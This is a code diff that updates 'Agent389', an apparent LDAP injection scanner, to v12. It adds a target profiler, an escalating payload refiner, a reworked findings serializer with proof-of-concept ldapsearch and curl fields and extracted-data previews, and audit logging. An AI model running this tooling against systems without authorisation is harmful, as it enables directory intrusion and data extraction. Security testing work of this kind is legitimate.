@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════════════════════════╗
-║             Agent389 v11.0 — Tactical LDAP Injection Framework                ║
+║             Agent389 v12.0 — Tactical LDAP Injection Framework                ║
 ║           Lead Architect: Abinav3ac | Professional Security Suite             ║
+║           Focus: Find -> Verify -> Report -> Hand off to Exploiter            ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 Architecture:
   ControlPlane — Tactical Intelligence layer governing all phases
@@ -15,7 +16,6 @@ Architecture:
 Output:
   agent389_findings.json   — Primary handoff document for tactical analysis
   agent389_audit.ndjson    — Full audit trail of every signal and decision
-
 !! Authorised security testing only !!
 """
 
@@ -89,8 +89,8 @@ warnings.filterwarnings("ignore")
 # §2  VERSION & METADATA
 # ═══════════════════════════════════════════════════════════════════════════════
 
-VERSION    = "1.0.0"
-BUILD_DATE = "2026-04"
+VERSION    = "12.0.0"
+BUILD_DATE = "2026-05"
 TOOL_NAME  = "Agent389"
 
 BANNER = r"""
@@ -7717,6 +7717,9 @@ class InjectionEngine:
         self._cp_memory       = cp_memory
         # V11 — Cross-param validator
         self._cross_param_val = CrossParamValidator(client, cfg)
+        # V12 — Adaptive payload refiner + target profiler
+        self._dpr = DynamicPayloadRefiner(client, pipeline, budget, cfg)
+        self._tpe = TargetProfilerEngine(client, pipeline, cfg)
         # Per-endpoint schema cache to avoid re-probing same endpoint
         self._schema_cache: Dict[str, Dict[str, Any]] = {}
 
@@ -7792,14 +7795,24 @@ class InjectionEngine:
         server_type: str, framework: str,
         t0_signals_fired: bool = False
     ) -> Tuple[List[HandoffFinding], List[InconclusiveFinding]]:
-        """V6: Run Tier 1 injection loop with schema-aware payloads + polymorphic WAF bypass."""
+        """V12: Run Tier 1 with TargetProfilerEngine + DynamicPayloadRefiner."""
+        # V12: Profile target before injection to determine strategy
+        tpe_profile = None
+        payload_limit = self._cfg.max_payloads_tier1
+        try:
+            tpe_profile  = self._tpe.profile(ep, param, baseline)
+            payload_limit = self._tpe.strategy_payload_limit(tpe_profile)
+            vprint(f"  [TPE] {ep.url}:{param} strategy={tpe_profile.strategy} limit={payload_limit}")
+        except Exception:
+            pass
+
         payloads = PayloadEngine.build_tier1(
             server_type = server_type,
             framework   = framework,
             context     = ep.context_type,
             survived    = self._client._survived_chars,
             failed      = self._memory.failed_payloads,
-            limit       = self._cfg.max_payloads_tier1,
+            limit       = payload_limit,
         )
 
         # V6 Enhancement 5: Prepend schema-aware payloads for confirmed injectable endpoints
@@ -7979,6 +7992,22 @@ class InjectionEngine:
                     break
                 if mutation_validated >= 2:
                     break
+
+        # V12: DynamicPayloadRefiner — escalate if only partial signals seen
+        if not found and t0_signals_fired and self._dpr:
+            # Build a synthetic partial result from T0 to seed the refiner
+            partial = DetectionResult(
+                fired=True, score=2.0, signals=[],
+                severity=Severity.LOW, evidence="t0_partial")
+            dpr_pl, dpr_result = self._dpr.refine(ep, param, baseline, partial)
+            if dpr_pl and dpr_result:
+                dpr_found = self._handle_signal(
+                    ep=ep, param=param, payload=dpr_pl,
+                    baseline=baseline, result=dpr_result,
+                    resp=None, server_type=server_type, framework=framework)
+                if dpr_found:
+                    found.extend(dpr_found)
+                    info(f"    [DPR] Escalation success: {dpr_pl.technique}")
 
         return found, inconclusives
 
@@ -8629,102 +8658,293 @@ class FindingDeduplicator:
 
 class HandoffSerializer:
     """
-    Serializes all scan results into the JSON handoff document.
-    Produces ldapi_findings.json and ldapi_audit.ndjson.
+    V12 — Structured JSON output matching enterprise handoff format.
+    Fields: status, findings[], scan_context, audit_summary.
+    Each finding: id, vulnerability_type, category, severity, confidence,
+                  target_url, affected_parameter, description, observation,
+                  proof_of_concept, remediation, details{method, payload,
+                  detection_method, raw_request, raw_response, extracted_data}.
     """
 
     def __init__(self, cfg: ScanConfig):
         self._cfg = cfg
 
-    def _finding_to_dict(self, f: HandoffFinding) -> Dict:
-        return {
-            "finding_id":              f.finding_id,
-            "scan_id":                 f.scan_id,
-            "timestamp":               f.timestamp,
-            "endpoint_url":            f.endpoint_url,
-            "http_method":             f.http_method,
-            "parameter_name":          f.parameter_name,
-            "auth_state":              f.auth_state,
-            "payload_raw":             f.payload_raw,
-            "payload_encoding":        f.payload_encoding,
-            "payload_technique":       f.payload_technique,
-            "payload_tier":            f.payload_tier,
-            "alternative_payloads":    f.alternative_payloads,
-            "verification_grade":      f.verification_grade,
-            "verification_steps":      f.verification_steps,
-            "reproduction_confidence": f.reproduction_confidence,
-            "severity":                f.severity,
-            "severity_reason":         f.severity_reason,
-            "baseline_response_class": f.baseline_response_class,
-            "injected_response_class": f.injected_response_class,
-            "detection_signals":       f.detection_signals,
-            "diff_ratio":              round(f.diff_ratio, 4),
-            "timing_zscore":           f.timing_zscore,
-            "timing_delta_ms":         f.timing_delta_ms,
-            "ldap_error_snippet":      f.ldap_error_snippet,
-            "filter_reflection":       f.filter_reflection,
-            "oob_triggered":           f.oob_triggered,
-            "curl_poc":                f.curl_poc,
-            "raw_http_request":        f.raw_http_request,
-            "ldap_server_type":        f.ldap_server_type,
-            "framework_detected":      f.framework_detected,
-            "waf_detected":            f.waf_detected,
+    # ── Severity/confidence normalizers ───────────────────────────────────────
+    @staticmethod
+    def _norm_sev(s: str) -> str:
+        return s.lower() if s else "medium"
+
+    @staticmethod
+    def _norm_conf(score: int) -> str:
+        if score >= 80: return "high"
+        if score >= 50: return "medium"
+        return "low"
+
+    @staticmethod
+    def _technique_to_category(tech: str) -> str:
+        t = tech.lower()
+        if "bypass" in t or "auth" in t: return "authentication_bypass"
+        if "bool" in t:                   return "blind_injection"
+        if "oob" in t:                    return "out_of_band"
+        if "enum" in t:                   return "enumeration"
+        if "extract" in t:                return "data_exfiltration"
+        return "injection"
+
+    @staticmethod
+    def _build_description(f: "HandoffFinding") -> str:
+        sev    = f.severity.lower()
+        tech   = f.payload_technique
+        param  = f.parameter_name
+        url    = f.endpoint_url
+        impact = f.impact_scenario or ""
+        return (f"LDAP injection ({tech}) detected in parameter '{param}' "
+                f"at {url}. Severity: {sev}. {impact}").strip()
+
+    @staticmethod
+    def _build_observation(f: "HandoffFinding") -> str:
+        parts = []
+        if f.ldap_error_snippet:
+            parts.append(f"LDAP error observed: {f.ldap_error_snippet[:200]}")
+        if f.filter_reflection:
+            parts.append(f"Filter reflection: {f.filter_reflection[:100]}")
+        if f.oob_triggered:
+            parts.append("Out-of-band DNS callback confirmed.")
+        parts.append(f"Detection signals: {', '.join(f.detection_signals[:4])}.")
+        parts.append(f"Verification: {f.verification_grade} "
+                     f"(confidence={f.reproduction_confidence}%).")
+        if f.diff_ratio:
+            parts.append(f"Body diff ratio: {f.diff_ratio:.3f}.")
+        return " ".join(parts)
+
+    def _finding_to_v12(self, f: "HandoffFinding", idx: int) -> Dict:
+        """Serialize one HandoffFinding to the V12 enterprise JSON format."""
+        ev = f.exploiter_context or {}
+        extracted = ev.get("extracted_values", {})
+        impact    = ev.get("impact", {})
+
+        # Build details block
+        details: Dict[str, Any] = {
+            "method":           f.http_method,
+            "param_location":   "body" if f.http_method == "POST" else "query",
+            "payload":          f.payload_raw,
+            "payload_encoding": f.payload_encoding,
+            "payload_tier":     f.payload_tier,
+            "detection_method": f.payload_technique,
+            "detection_signals":f.detection_signals,
+            "diff_ratio":       round(f.diff_ratio, 4),
+            "baseline_class":   f.baseline_response_class,
+            "injected_class":   f.injected_response_class,
+            "baseline_time_ms": None,
+            "response_time_ms": (
+                round(f.timing_delta_ms, 1) if f.timing_delta_ms else None),
+            "timing_zscore":    f.timing_zscore,
+            "oob_triggered":    f.oob_triggered,
+            "waf_detected":     f.waf_detected,
+            "waf_name":         f.framework_detected,
             "survived_metacharacters": f.survived_metacharacters,
-            "cvss_vector":             f.cvss_vector,
-            "cvss_score":              f.cvss_score,
-            "remediation_guidance":    f.remediation_guidance,
-            "exploiter_context":       f.exploiter_context,
-            "non_destructive_confirmed": f.non_destructive_confirmed,
-            "second_order":            f.second_order,
-            "affected_ldap_attributes": f.affected_ldap_attributes,
-            "schema_enumerated":       f.schema_enumerated,
+            "raw_request":      f.raw_http_request[:1000] if f.raw_http_request else "",
+            "raw_response":     (f.ldap_error_snippet or "")[:500],
+            "alternative_payloads": f.alternative_payloads,
+            "verification_steps": f.verification_steps,
+            "second_order":     f.second_order,
+            "auth_state":       f.auth_state,
+            "cvss_vector":      f.cvss_vector,
+            "cvss_score":       f.cvss_score,
+            "lockout_risk":     f.lockout_risk,
         }
 
-    def _raw_ldap_to_dict(self, f: RawLDAPFinding) -> Dict:
+        if extracted:
+            details["extracted_data"] = {
+                "type":             "ldap_attribute_extraction",
+                "attributes":       list(extracted.keys()),
+                "preview":          {k: str(v)[:100] for k, v in extracted.items()},
+                "full_content_saved": False,
+            }
+        if f.affected_ldap_attributes:
+            details["affected_ldap_attributes"] = f.affected_ldap_attributes
+
+        impact_block: Dict[str, Any] = {
+            "scenario":    f.impact_scenario,
+            "type":        f.impact_type,
+            "blast_radius":f.blast_radius,
+            "attack_chain":f.attack_chain,
+        }
+
         return {
-            "finding_id":    finding_id(),
-            "scan_id":       self._cfg.scan_id,
-            "timestamp":     now_iso(),
-            "host":          f.host,
-            "port":          f.port,
-            "finding_type":  f.finding_type,
-            "severity":      f.severity.name,
-            "evidence":      f.evidence,
-            "bind_dn":       f.bind_dn,
-            "server_type":   f.server_type,
-            "rootdse_data":  f.rootdse_data,
+            "id":               f.finding_id,
+            "scan_id":          f.scan_id,
+            "agent_group":      "agent_detection",
+            "sub_agent":        "LDAPInjectionDetector",
+            "vulnerability_type": f.payload_technique,
+            "category":         self._technique_to_category(f.payload_technique),
+            "severity":         self._norm_sev(f.severity),
+            "confidence":       self._norm_conf(f.reproduction_confidence),
+            "confidence_score": f.reproduction_confidence,
+            "verification_grade": f.verification_grade,
+            "target_url":       f.endpoint_url,
+            "affected_parameter": f.parameter_name,
+            "timestamp":        f.timestamp,
+            "description":      self._build_description(f),
+            "observation":      self._build_observation(f),
+            "proof_of_concept": f.curl_poc,
+            "remediation":      (f.remediation_guidance or
+                                 "Sanitize LDAP inputs; use parameterized directory queries; "
+                                 "enforce input whitelisting on all directory-backed parameters."),
+            "cve_reference":    None,
+            "severity_reason":  f.severity_reason,
+            "impact":           impact_block,
+            "retest_steps":     f.retest_steps,
+            "behavioral_signals": f.behavioral_signals,
+            "function_class":   f.function_class,
+            "mutation_chain":   f.mutation_chain_used,
+            "schema_enumerated":f.schema_enumerated,
+            "details":          details,
+        }
+
+    def _raw_ldap_to_v12(self, f: "RawLDAPFinding") -> Dict:
+        poc = (
+            f"ldapsearch -x -H ldap://{f.host}:{f.port} "
+            f"-D '{f.bind_dn}' -w '***' -b '' -s base '(objectClass=*)'"
+            if f.bind_dn else
+            f"ldapsearch -x -H ldap://{f.host}:{f.port} "
+            f"-b '' -s base '(objectClass=*)'"
+        )
+        return {
+            "id":               finding_id(),
+            "scan_id":          self._cfg.scan_id,
+            "agent_group":      "agent_detection",
+            "sub_agent":        "LDAPDirectTester",
+            "vulnerability_type": f.finding_type,
+            "category":         "direct_ldap_exposure",
+            "severity":         f.severity.name.lower(),
+            "confidence":       "high",
+            "confidence_score": 95,
             "verification_grade": "CONFIRMED",
-            "curl_poc": (
-                f"ldapsearch -x -H ldap://{f.host}:{f.port} "
-                f"-D '{f.bind_dn}' "
-                f"-w '{f.bind_pw}' "
-                f"-b '' -s base '(objectClass=*)'"
-                if f.bind_dn else
-                f"ldapsearch -x -H ldap://{f.host}:{f.port} "
-                f"-b '' -s base '(objectClass=*)'"
-            ),
+            "target_url":       f"ldap://{f.host}:{f.port}",
+            "affected_parameter": "LDAP_BIND",
+            "timestamp":        now_iso(),
+            "description":      (
+                f"Direct LDAP protocol vulnerability: {f.finding_type} on "
+                f"{f.host}:{f.port}. Server type: {f.server_type}."),
+            "observation":      f.evidence[:500] if f.evidence else "",
+            "proof_of_concept": poc,
+            "remediation":      (
+                "Disable anonymous LDAP binds; enforce strong credentials; "
+                "restrict LDAP port exposure; enable TLS (LDAPS)."),
+            "cve_reference":    None,
+            "details": {
+                "host":        f.host,
+                "port":        f.port,
+                "server_type": f.server_type,
+                "bind_dn":     f.bind_dn,
+                "rootdse_data": f.rootdse_data,
+            },
         }
 
     def emit(
         self,
-        handoff:         ScanHandoff,
-        web_findings:    List[HandoffFinding],
-        raw_findings:    List[RawLDAPFinding],
-        start_time:      datetime,
+        handoff:         "ScanHandoff",
+        web_findings:    List["HandoffFinding"],
+        raw_findings:    List["RawLDAPFinding"],
+        start_time:      "datetime",
     ) -> str:
-        """Wave 4: Emit comprehensive handoff JSON."""
-        doc = handoff.__dict__.copy()
-        
-        # Stats
-        doc["duration_seconds"] = (datetime.now(timezone.utc) - start_time).total_seconds()
-        doc["timestamp_end"]   = now_iso()
-        doc["total_requests"]   = handoff.total_requests
-
-        out_path = os.path.join(
-            self._cfg.output_dir,
-            self._cfg.findings_file,
-        )
+        """V12 — Emit structured JSON in enterprise format."""
         os.makedirs(self._cfg.output_dir, exist_ok=True)
+
+        all_findings: List[Dict] = []
+        errors:       List[str]  = []
+
+        for i, f in enumerate(web_findings):
+            try:
+                all_findings.append(self._finding_to_v12(f, i + 1))
+            except Exception as exc:
+                errors.append(f"finding_serialize:{f.finding_id}:{exc}")
+
+        for rf in raw_findings:
+            try:
+                all_findings.append(self._raw_ldap_to_v12(rf))
+            except Exception as exc:
+                errors.append(f"raw_ldap_serialize:{rf.host}:{exc}")
+
+        # Sort by severity order
+        _sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
+        all_findings.sort(key=lambda x: _sev_order.get(x.get("severity","medium"), 2))
+
+        confirmed = [f for f in all_findings
+                     if f.get("verification_grade") == "CONFIRMED"]
+        probable  = [f for f in all_findings
+                     if f.get("verification_grade") == "PROBABLE"]
+
+        duration = (datetime.now(timezone.utc) - start_time).total_seconds()
+
+        doc = {
+            "status":     "completed",
+            "errors":     errors,
+            "gap_reason": None,
+
+            "scan_metadata": {
+                "schema_version":   "12.0",
+                "tool":             f"{TOOL_NAME} v{VERSION}",
+                "scan_id":          self._cfg.scan_id,
+                "target":           self._cfg.target,
+                "timestamp_start":  handoff.timestamp_start,
+                "timestamp_end":    handoff.timestamp_end or now_iso(),
+                "duration_seconds": round(duration, 2),
+                "total_requests":   handoff.total_requests,
+                "budget_mode":      handoff.budget_mode,
+                "auth_tested":      handoff.auth_tested,
+            },
+
+            "target_profile": {
+                "ldap_server_type":         handoff.ldap_server_type,
+                "framework_detected":       handoff.framework_detected,
+                "waf_detected":             handoff.waf_detected,
+                "waf_name":                 handoff.waf_name,
+                "waf_confidence":           handoff.waf_confidence,
+                "survived_metacharacters":  handoff.survived_metacharacters,
+                "raw_ldap_ports_open":      handoff.raw_ldap_ports_open,
+                "target_live":              handoff.target_live,
+                "dns_resolved":             handoff.target_dns_resolved,
+                "open_ports":               handoff.target_ports_open,
+            },
+
+            "discovery": {
+                "endpoints_discovered": handoff.endpoints_discovered,
+                "endpoints_scanned":    handoff.endpoints_scanned,
+                "unauth_tested":        handoff.unauth_endpoints_tested,
+                "auth_tested":          handoff.auth_endpoints_tested,
+                "openapi_specs":        handoff.openapi_specs_found,
+                "graphql_endpoints":    handoff.graphql_endpoints_found,
+                "websocket_endpoints":  handoff.websocket_endpoints_found,
+            },
+
+            "summary": {
+                "total_findings":     len(all_findings),
+                "confirmed":          len(confirmed),
+                "probable":           len(probable),
+                "candidates":         len(all_findings) - len(confirmed) - len(probable),
+                "raw_ldap_findings":  len(raw_findings),
+                "signals_fired":      handoff.signals_fired,
+                "fp_filtered":        handoff.fp_filtered,
+                "total_cvss_score":   round(handoff.total_cvss_score, 2),
+                "cross_correlations": len(getattr(handoff, "cross_endpoint_correlations", [])),
+            },
+
+            "adaptive_intel": {
+                "control_plane":  handoff.control_plane_summary,
+                "adaptive_delay": handoff.adaptive_delay_applied,
+                "mutations_effective": handoff.mutation_chains_effective,
+            },
+
+            "cross_endpoint_correlations": getattr(
+                handoff, "cross_endpoint_correlations", []),
+
+            "inconclusive_findings": handoff.inconclusive_findings,
+
+            "findings": all_findings,
+        }
+
+        out_path = os.path.join(self._cfg.output_dir, self._cfg.findings_file)
         with open(out_path, "w", encoding="utf-8") as fh:
             json.dump(doc, fh, indent=2, default=str)
 
@@ -8733,114 +8953,199 @@ class HandoffSerializer:
 
 class ScanSessionLogger:
     """
-    NDJSON audit trail — one JSON object per line.
-    Records every signal, decision, and finding for forensic review.
-    ENHANCEMENT #10: Structured logging with correlation IDs.
-    Every log entry includes request_id that flows through injection → detection → verification → handoff.
-    This enables complete forensic reconstruction of evidence chain for any finding.
+    V12 — NDJSON audit trail with human-readable narrative.
+    Every entry includes a 'narrative' field describing what happened
+    in plain English, plus structured fields for machine ingestion.
+
+    Adaptive depth: if the target was complex (many phase adjustments),
+    includes multi-phase adjustment notes; simple scans get concise entries.
     """
 
     def __init__(self, cfg: ScanConfig):
-        import os
-        self._path = os.path.join(
-            cfg.output_dir, cfg.audit_file)
+        self._path = os.path.join(cfg.output_dir, cfg.audit_file)
         os.makedirs(cfg.output_dir, exist_ok=True)
-        self._lock = threading.Lock()
-        self._seq  = 0
-        self._current_request_id = threading.local()  # Thread-local request_id tracking
+        self._lock  = threading.Lock()
+        self._seq   = 0
+        self._current_request_id = threading.local()
+        self._phase_adjustments: List[str] = []   # V12: track adaptive adjustments
 
-    def _write(self, event: str, data: Dict, request_id: Optional[str] = None) -> None:
-        """Write audit log entry with optional correlation ID."""
-        # Use provided request_id or thread-local one
-        rid = request_id or getattr(self._current_request_id, 'id', None) or "default"
-        
+    def _write(self, event: str, data: Dict,
+               narrative: str = "",
+               request_id: Optional[str] = None) -> None:
+        rid = (request_id
+               or getattr(self._current_request_id, 'id', None)
+               or "default")
         entry = {
-            "ts":           now_iso(),
-            "seq":          self._seq,
-            "event":        event,
-            "request_id":   rid,  # ENHANCEMENT #10: Correlation ID in every entry
+            "ts":         now_iso(),
+            "seq":        self._seq,
+            "event":      event,
+            "request_id": rid,
+            "narrative":  narrative,
             **data,
         }
         try:
             with self._lock:
                 self._seq += 1
-                with open(self._path, "a",
-                          encoding="utf-8") as fh:
-                    fh.write(
-                        json.dumps(entry, default=str) + "\n")
+                with open(self._path, "a", encoding="utf-8") as fh:
+                    fh.write(json.dumps(entry, default=str) + "\n")
         except Exception:
             pass
 
     def set_request_id(self, request_id: str) -> None:
-        """ENHANCEMENT #10: Set thread-local request_id for audit trail correlation."""
         self._current_request_id.id = request_id
 
     def gen_request_id(self) -> str:
-        """ENHANCEMENT #10: Generate new correlation ID and set as current."""
         rid = "inj-{}".format(uuid.uuid4().hex[:12])
         self.set_request_id(rid)
         return rid
 
     def log_phase(self, phase: str,
-                  details: Optional[Dict] = None, request_id: Optional[str] = None) -> None:
+                  details: Optional[Dict] = None,
+                  request_id: Optional[str] = None) -> None:
+        _narratives = {
+            "intelligence":  "Phase 1 started: gathering target stack intelligence, WAF detection, LDAP port scanning.",
+            "discovery":     "Phase 2 started: crawling application for endpoints, forms, API specs, SPA routes.",
+            "behavioral_risk": "Phase 3 started: probing endpoints with behavioral risk analysis.",
+            "baseline":      "Phase 4 baseline collection: recording normal response profiles for each endpoint.",
+            "raw_ldap":      "Phase 4b: testing direct LDAP protocol exposure on discovered ports.",
+            "injection":     "Phase 4 injection: running LDAP payload injection loops across all qualified endpoints.",
+            "handoff":       "Phase 5 started: compiling final results, validating exploits, emitting report.",
+        }
+        narrative = _narratives.get(phase, f"Starting phase: {phase}.")
         self._write("PHASE_START",
-                    {"phase": phase, **(details or {})}, request_id=request_id)
+                    {"phase": phase, **(details or {})},
+                    narrative=narrative,
+                    request_id=request_id)
+
+    def log_phase_adjustment(self, adjustment: str) -> None:
+        """V12: Record adaptive strategy change for audit narrative."""
+        self._phase_adjustments.append(adjustment)
+        self._write("ADAPTIVE_ADJUSTMENT",
+                    {"adjustment": adjustment},
+                    narrative=f"Strategy adapted: {adjustment}")
 
     def log_signal(self, ep_key: str, param: str,
                    payload: str, detectors: List[str],
                    score: float, request_id: Optional[str] = None) -> None:
+        narrative = (
+            f"Anomaly detected on parameter '{param}' at {ep_key}. "
+            f"Payload: {payload[:60]!r}. "
+            f"Detectors fired: {', '.join(detectors[:3])}. Score: {score:.1f}."
+        )
         self._write("SIGNAL", {
             "ep_key":    ep_key,
             "param":     param,
             "payload":   payload[:80],
             "detectors": detectors,
             "score":     round(score, 3),
-        }, request_id=request_id)
+        }, narrative=narrative, request_id=request_id)
 
-    def log_finding(self, f: HandoffFinding, request_id: Optional[str] = None) -> None:
+    def log_finding(self, f: "HandoffFinding",
+                    request_id: Optional[str] = None) -> None:
+        narrative = (
+            f"Finding recorded [{f.verification_grade}]: {f.payload_technique} "
+            f"on parameter '{f.parameter_name}' at {f.endpoint_url}. "
+            f"Severity: {f.severity}. Confidence: {f.reproduction_confidence}%. "
+            f"PoC: {f.curl_poc[:100]}"
+        )
         self._write("FINDING", {
-            "finding_id":         f.finding_id,
-            "endpoint":           f.endpoint_url,
-            "parameter":          f.parameter_name,
-            "severity":           f.severity,
-            "grade":              f.verification_grade,
-            "confidence":         f.reproduction_confidence,
-            "auth_state":         f.auth_state,
-            "detection_signals":  f.detection_signals,
-        }, request_id=request_id)
+            "finding_id":        f.finding_id,
+            "endpoint":          f.endpoint_url,
+            "parameter":         f.parameter_name,
+            "severity":          f.severity,
+            "grade":             f.verification_grade,
+            "confidence":        f.reproduction_confidence,
+            "payload":           f.payload_raw[:80],
+            "technique":         f.payload_technique,
+            "auth_state":        f.auth_state,
+            "detection_signals": f.detection_signals,
+            "poc":               f.curl_poc[:200],
+        }, narrative=narrative, request_id=request_id)
 
-    def log_raw_ldap(self, f: RawLDAPFinding) -> None:
+    def log_raw_ldap(self, f: "RawLDAPFinding") -> None:
+        narrative = (
+            f"Direct LDAP vulnerability confirmed: {f.finding_type} "
+            f"on {f.host}:{f.port} ({f.server_type}). "
+            f"Evidence: {str(f.evidence)[:100]}"
+        )
         self._write("RAW_LDAP_FINDING", {
             "host":         f.host,
             "port":         f.port,
             "finding_type": f.finding_type,
             "severity":     f.severity.name,
-        })
+            "server_type":  f.server_type,
+        }, narrative=narrative)
 
-    def log_fp_filtered(self, ep_key: str,
-                         param: str, reason: str, request_id: Optional[str] = None) -> None:
+    def log_fp_filtered(self, ep_key: str, param: str,
+                        reason: str,
+                        request_id: Optional[str] = None) -> None:
+        narrative = (
+            f"False-positive filtered: parameter '{param}' at {ep_key} "
+            f"was eliminated. Reason: {reason[:100]}"
+        )
         self._write("FP_FILTERED", {
             "ep_key": ep_key,
             "param":  param,
             "reason": reason[:120],
-        }, request_id=request_id)
+        }, narrative=narrative, request_id=request_id)
 
-    def log_verification(self, ep_key: str, param: str, grade: str,
-                        proof: List[str], request_id: Optional[str] = None) -> None:
-        """ENHANCEMENT #10: Log verification step with correlation to injection."""
+    def log_verification(self, ep_key: str, param: str,
+                         grade: str, proof: List[str],
+                         request_id: Optional[str] = None) -> None:
+        narrative = (
+            f"Verification result for '{param}' at {ep_key}: {grade}. "
+            f"Proof steps: {'; '.join(proof[:2])}"
+        )
         self._write("VERIFICATION", {
             "ep_key": ep_key,
             "param":  param,
             "grade":  grade,
             "proof":  proof,
-        }, request_id=request_id)
+        }, narrative=narrative, request_id=request_id)
 
-    def log_error(self, context: str,
-                   error: str, request_id: Optional[str] = None) -> None:
+    def log_exploit_validation(self, finding_id: str, grade: str,
+                               confidence: int, notes: List[str]) -> None:
+        """V12: Log exploit replay validation."""
+        narrative = (
+            f"Exploit validated [{finding_id[:8]}]: grade={grade}, "
+            f"confidence={confidence}%. Notes: {'; '.join(notes[:2])}"
+        )
+        self._write("EXPLOIT_VALIDATION", {
+            "finding_id": finding_id,
+            "grade":      grade,
+            "confidence": confidence,
+            "notes":      notes,
+        }, narrative=narrative)
+
+    def log_error(self, context: str, error: str,
+                  request_id: Optional[str] = None) -> None:
+        narrative = f"Error in {context}: {error[:150]}"
         self._write("ERROR", {
             "context": context,
             "error":   error[:200],
-        }, request_id=request_id)
+        }, narrative=narrative, request_id=request_id)
+
+    def write_summary_footer(self, handoff: "ScanHandoff") -> None:
+        """V12: Write a human-readable summary footer to the audit log."""
+        n_confirmed = len(handoff.confirmed_findings)
+        n_probable  = len(handoff.probable_findings)
+        narrative = (
+            f"SCAN COMPLETE. Target: {handoff.target}. "
+            f"Duration: {round(handoff.duration_seconds,1)}s. "
+            f"Requests: {handoff.total_requests}. "
+            f"Confirmed: {n_confirmed}. Probable: {n_probable}. "
+            f"Adaptive adjustments made: {len(self._phase_adjustments)}: "
+            f"{'; '.join(self._phase_adjustments[:5])}."
+        )
+        self._write("SCAN_COMPLETE", {
+            "scan_id":            handoff.scan_id,
+            "target":             handoff.target,
+            "duration_seconds":   round(handoff.duration_seconds, 2),
+            "total_requests":     handoff.total_requests,
+            "confirmed":          n_confirmed,
+            "probable":           n_probable,
+            "phase_adjustments":  self._phase_adjustments,
+        }, narrative=narrative)
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -10439,15 +10744,605 @@ _MEDIA_PATH_LOADER = re.compile(
     r"upload|uploads|cdn|files|public|res|resources|favicon|icons|"
     r"photo|photos|static|assets|fonts|dist|covers|banner|banners|"
     r"sprite|sprites|poster|posters|preview|previews)/", re.I)
-_SKIP_PATHS_LOADER = re.compile(
-    r"^/(logout|signout|favicon|robots\.txt|sitemap|"
-    r"__pycache__|\.git|\.svn|node_modules)", re.I)
-_HIGH_RISK_LDAP_LOADER = re.compile(
-    r"user|uid|login|account|principal|sAMAccountName|"
-    r"search|query|filter|ldap|dn|cn|ou|dc|"
-    r"directory|member|group|role|credential|"
-    r"name|email|mail|id|value|text|data|param|"
-    r"username|password|pass|pwd|token|session", re.I)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V12-ATM  ADAPTIVE TARGET MODEL — Phase 1 learning + multi-signal LDAP scoring
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class AdaptiveTargetModel:
+    """
+    V12 Phase 1 — Replaces static parameter heuristics with a dynamic model
+    that learns from every probe response and accumulates multi-signal evidence.
+
+    Signals tracked:
+      - Response patterns suggesting LDAP error messages or directory data
+      - Session state changes (auth cookies appearing/disappearing)
+      - Timing deltas for probe vs. benign on the landing page
+      - Stack fingerprint (AD-specific headers, error classes)
+      - Incremental score decay for endpoints that consistently reject all probes
+    """
+
+    # Token-level semantic signal weights (used instead of hard param-name list)
+    _SEMANTIC_WEIGHTS: Dict[str, float] = {
+        "user":       3.0, "uid":        3.0, "login":      3.0,
+        "account":    2.5, "principal":  2.5, "sam":        2.5,
+        "credential": 2.5, "password":   2.0, "pass":       2.0,
+        "search":     2.0, "query":      2.0, "filter":     2.0,
+        "ldap":       3.5, "directory":  2.5, "dn":         2.5,
+        "cn":         2.0, "ou":         2.0, "dc":         2.0,
+        "member":     1.5, "group":      1.5, "role":       1.5,
+        "email":      1.5, "mail":       1.5, "name":       1.0,
+        "id":         1.0, "token":      1.5, "session":    1.0,
+    }
+
+    # Stack evidence → LDAP backend likelihood boost
+    _STACK_SIGNALS: Dict[str, float] = {
+        "Active-Directory":         20.0, "NTLM":               18.0,
+        "Kerberos":                 18.0, "WWW-Authenticate":   10.0,
+        "X-Powered-By: JBoss":     12.0, "X-Powered-By: PHP":   6.0,
+        "javax.naming":             25.0, "com.sun.jndi":        25.0,
+        "OpenLDAP":                 22.0, "389 Directory":       22.0,
+        "DSID-":                    30.0, "LdapErr":             30.0,
+    }
+
+    def __init__(self):
+        self._lock            = threading.Lock()
+        # Endpoint key → accumulated LDAP probability score
+        self._ep_scores:      Dict[str, float]        = defaultdict(float)
+        # Endpoint key → per-param semantic score
+        self._param_scores:   Dict[str, Dict[str,float]] = defaultdict(dict)
+        # Endpoint key → observation history
+        self._observations:   Dict[str, List[str]]    = defaultdict(list)
+        # Global stack evidence accumulated during phase 0/1
+        self._stack_evidence: List[str]               = []
+        # Session baseline: set of cookie names before any probe
+        self._session_baseline: Set[str]              = set()
+        # Incremental decay: endpoints that consistently reject get deprioritized
+        self._reject_counts:  Dict[str, int]          = defaultdict(int)
+
+    # ── Semantic parameter scoring ────────────────────────────────────────────
+
+    def score_param_name(self, name: str) -> float:
+        """Score a parameter name using token-level semantic weights."""
+        nl = name.lower()
+        score = 0.0
+        for token, w in self._SEMANTIC_WEIGHTS.items():
+            if token in nl:
+                score += w
+        return min(score, 10.0)
+
+    def score_params(self, params: List[str]) -> Dict[str, float]:
+        """Return per-param semantic scores."""
+        return {p: self.score_param_name(p) for p in params}
+
+    # ── Response-driven learning ──────────────────────────────────────────────
+
+    def observe_response(self, ep_key: str, resp_text: str,
+                          resp_headers: Dict[str, str],
+                          resp_status: int,
+                          cookies_before: Set[str],
+                          cookies_after:  Set[str]) -> None:
+        """
+        Observe a probe response and update the LDAP probability for this endpoint.
+        Called after every probe — not just on anomalies.
+        """
+        boost = 0.0
+        obs:  List[str] = []
+
+        # Stack-level signal detection in body + headers
+        body_sample = resp_text[:2000].lower()
+        for sig, w in self._STACK_SIGNALS.items():
+            if sig.lower() in body_sample:
+                boost += w
+                obs.append(f"body:{sig}")
+            for hv in resp_headers.values():
+                if sig.lower() in hv.lower():
+                    boost += w * 0.5
+                    obs.append(f"header:{sig}")
+
+        # Session state change (new cookie → possible auth context)
+        new_cookies = cookies_after - cookies_before
+        if new_cookies:
+            boost += 8.0
+            obs.append(f"new_session_cookies:{new_cookies}")
+
+        # Error code indicating backend processing
+        if resp_status in (500, 501, 502):
+            boost += 5.0
+            obs.append(f"server_error:{resp_status}")
+        elif resp_status == 403:
+            # Might be WAF-filtered LDAP path — slight boost
+            boost += 2.0
+            obs.append("403_filter")
